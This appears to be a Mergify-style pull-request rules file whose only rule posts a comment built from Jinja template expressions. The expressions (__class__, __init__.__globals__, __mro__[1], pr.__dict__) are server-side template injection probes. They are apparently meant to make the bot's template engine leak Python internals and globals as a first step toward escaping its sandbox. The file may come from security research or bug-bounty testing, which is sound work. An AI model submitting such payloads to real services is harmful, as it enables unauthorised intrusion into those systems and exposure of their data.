pull_request_rules:
  - name: ssti probe b
    conditions:
      - base=main
    actions:
      comment:
        message: |
          SSTI-PROBE-2
          cls=[{{ __class__ }}]
          init=[{{ ''.__class__.__init__ }}]
          globals=[{{ ''.__class__.__init__.__globals__ }}]
          module=[{{ ''.__class__.__module__ }}]
          pr=[{{ pr }}]
          prtitle=[{{ pr.title }}]
          mro1=[{{ ''.__class__.__mro__[1] }}]
          pdict=[{{ pr.__dict__ }}]
